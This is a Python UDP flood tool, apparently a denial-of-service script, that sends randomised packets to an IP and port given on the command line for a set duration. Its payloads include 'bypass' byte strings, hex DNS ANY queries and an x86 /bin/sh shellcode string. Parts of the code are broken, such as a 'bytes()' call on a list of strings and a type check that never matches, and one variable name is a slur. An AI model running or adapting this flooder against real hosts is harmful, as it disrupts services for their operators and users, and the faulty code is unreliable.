print("[Apollo] Welcome to the private apollo udp method made by N0B0DY!")
import socket
import sys
import time
import os
import random
import threading
payload1=None
def build_bypass():
    print("[Apollo] Building payload!")
    global payload1
    #Sampled from the "oack.c" method and seemed to bypass some stuff?
    gayassfuck = random.randint(725, 1000)
    payloadmsg = "<>-ABCZXY:/\\"
    payload1 = bytearray(gayassfuck)
    for mb in range(gayassfuck):
        payload1[mb] = ord(random.choice(payloadmsg))
    payload1=payload1.decode()
    return_temp=""; return_payload=""; bypass_chunks=["\x00","\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff", payload1]
    for _ in range(random.randint(random.randint(1,5), random.randint(5,30))):
        return_temp = random.choice(bypass_chunks)
        if return_temp == "FLFLFLFLFLFL":
            pass
        else:
            if type(return_temp) == "bytearray":
                return_temp=return_temp.decode()
            return_payload+=random.choice(bypass_chunks)
    return str(return_payload)
custom_payloads=[r"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80","002B01000001000000000000066F766873617303636F6D0000FF0001", "00380100000100000000000006676F6F676C6503636F6D0000FF0001", payload1, build_bypass(), build_bypass(), build_bypass(), build_bypass(), build_bypass(), build_bypass(), build_bypass(), build_bypass(), build_bypass(), build_bypass(), build_bypass()]
print("[Apollo] Build all payloads...")
print("[Apollo] Finishing up payload stuff...")
for i in custom_payloads:
    if i == None:
        print("[Apollo] Rebuilding messed up payload!")
        custom_payloads.remove(i); custom_payloads.append(build_bypass())
print("[Apollo] Payloads built: "+str(len(custom_payloads)))
print("[Apollo] Setting up sockets for flood")
def attack_udp(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        data = random.choice(bytes(custom_payloads))
        s.sendto(data, (ip, dport))
ip=sys.argv[1]
port=sys.argv[2]
tim2e=time.time()+int(sys.argv[3])
for _ in range(0,1):
 print("[Apollo] Starting Flood!")
 threading.Thread(target=attack_udp, args=(ip, int(port), tim2e, 5,)).start()